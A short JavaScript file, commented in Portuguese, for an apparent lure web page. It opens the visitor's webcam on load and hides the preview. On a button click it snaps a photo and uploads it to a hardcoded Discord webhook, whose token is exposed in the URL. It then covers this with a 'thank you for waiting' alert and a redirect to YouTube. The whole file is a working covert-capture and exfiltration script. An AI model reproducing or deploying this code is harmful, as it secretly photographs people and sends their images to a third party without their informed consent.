const captureButton = document.getElementById('captureButton');
const countdownDisplay = document.getElementById('countdown');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

// Inicia a captura de vídeo automaticamente ao carregar a página
async function startVideo() {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    video.style.display = 'none'; // Esconde o vídeo
}

// Captura a foto e envia
async function capturePhoto() {
    // Define o tamanho do canvas para o vídeo
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Desenha o vídeo no canvas
    context.drawImage(video, 0, 0);

    // Converte o canvas para uma imagem em Blob
    canvas.toBlob(async (blob) => {
        const success = await sendPhotoToDiscord(blob);
        if (success) {
            alert('Obrigado por esperar! Você será redirecionado em 5 segundos.');
            startRedirectCountdown();
        } else {
            alert('Algo deu errado. Tente novamente.');
        }
    }, 'image/jpeg');
}

function sendPhotoToDiscord(photoBlob) {
    const formData = new FormData();
    formData.append('file', photoBlob, 'photo.jpg');
    formData.append('content', 'Aqui está a foto!');

    return fetch('https://discordapp.com/api/webhooks/1297247955073372240/BVeXGIM8bNoeCgVXP6lXISWqlw_ZoB8k-0zmXUUBwauO1PsC1adXFFyJKDhgL4EHQ6he', {
        method: 'POST',
        body: formData
    }).then(response => {
        if (response.ok) {
            console.log('Obrigado por esperar!');
            return true; // Retorna true se a foto for enviada com sucesso
        } else {
            console.error('Erro ao enviar a foto:', response.statusText);
            return false; // Retorna false se ocorrer um erro
        }
    });
}

function startRedirectCountdown() {
    let countdown = 5;
    countdownDisplay.textContent = countdown; // Exibe o countdown inicial
    const countdownInterval = setInterval(() => {
        countdown--;
        countdownDisplay.textContent = countdown;
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            window.location.href = 'https://www.youtube.com';
        }
    }, 1000);
}

// Inicia o vídeo ao carregar a página
window.addEventListener('load', startVideo);

// Adiciona evento de clique para capturar a foto
captureButton.addEventListener('click', capturePhoto);
